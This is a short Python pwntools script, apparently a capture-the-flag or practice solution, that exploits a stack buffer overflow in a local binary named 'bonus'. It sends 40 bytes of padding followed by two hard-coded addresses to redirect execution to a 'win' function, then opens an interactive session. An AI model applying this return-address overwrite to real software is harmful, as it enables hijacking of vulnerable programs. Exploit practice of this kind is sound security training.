#!/usr/bin/env python3

from pwn import *

target = process("./bin/bonus")

payload_dothidden = b"A" * 40 + p64(0x401156)

address_win = 0x401173

final_payload = payload_dothidden + p64(address_win)

target.send(final_payload)

target.interactive()
